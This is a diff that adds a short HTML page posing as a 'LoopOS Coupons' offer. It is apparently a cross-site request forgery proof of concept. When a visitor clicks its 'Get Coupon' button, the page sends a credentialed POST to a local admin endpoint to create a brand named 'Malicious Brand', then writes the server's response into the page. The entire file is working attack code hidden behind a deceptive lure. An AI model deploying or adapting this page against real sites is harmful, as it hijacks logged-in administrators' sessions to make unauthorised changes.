@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>LoopOS Coupons</title>
+    <script>
+      async function submitForm() {
+        const data = new FormData();
+        data.append("name", "Malicious Brand");
+
+        try {
+          const response = await fetch("http://localhost:3000/admin/resources/brands", {
+            method: "POST",
+            credentials: "include",
+            body: data
+          });
+
+          const text = await response.text();
+          console.log("Response:", text);
+          document.getElementById("response").innerHTML = text;
+        } catch (error) {
+          console.error("Error:", error);
+        }
+      }
+    </script>
+  </head>
+  <body>
+    <h1>Get Your LoopOS Coupon</h1>
+    <button onclick="submitForm()">Get Coupon</button>
+    <div id="response"></div>
+  </body>
+</html>
